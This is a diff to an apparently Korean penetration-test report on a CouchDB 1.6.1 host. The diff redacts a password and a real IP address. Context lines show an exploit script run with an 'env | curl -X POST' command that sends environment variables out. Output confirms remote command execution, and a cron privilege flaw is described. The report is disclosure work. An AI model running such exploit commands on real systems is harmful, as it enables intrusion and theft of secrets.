@@ -751,7 +751,7 @@ Shellcodes: No Results
 └─# python 44913.py http://TARGET_IP:5984 --priv -c "env | curl -X POST --data-binary @- http://TARGET_IP/"                       
 
 [*] Detected CouchDB Version 1.6.1
-[+] User guest with password guest successfully created.
+[+] User guest with password [REDACTED_PASSWORD] successfully created.
 [+] Created payload at: http://TARGET_IP:5984/_config/query_servers/cmd
 [+] Command executed: env | curl -X POST --data-binary @- http://TARGET_IP/
 [*] Cleaning up.
@@ -846,8 +846,8 @@ dmz-prod-couchdb03
     link/ether ba:93:d9:34:cd:27 brd ff:ff:ff:ff:ff:ff link-netnsid 0
     inet6 fe80::b893:d9ff:fe34:cd27/64 scope link 
        valid_lft forever preferred_lft forever
-$ Connection to 3.34.197.144 closed by remote host.
-Connection to 3.34.197.144 closed.
+$ Connection to TARGET_IP closed by remote host.
+Connection to TARGET_IP closed.
 ```
 ![alt text]({{ site.baseurl }}/assets/images/bhpt/bhpt-redraccoon-report/1.png)
 
@@ -860,6 +860,7 @@ CouchDB 1.6.1 취약점을 통해 Docker 컨테이너 내부 명령 실행 가�
 2. Cron 작업 권한 설정 오류
 root 권한으로 실행되는 Cron 작업에서 실행 파일(/opt/backup/continuous-backup.py)에 대한 권한 검증이 미흡하여, 공격자가 해당 파일 또는 경로를 조작할 경우 임의 명령 실행 가능
 ![alt text]({{ site.baseurl }}/assets/images/bhpt/bhpt-redraccoon-report/image-18.png)
+
 
 
 
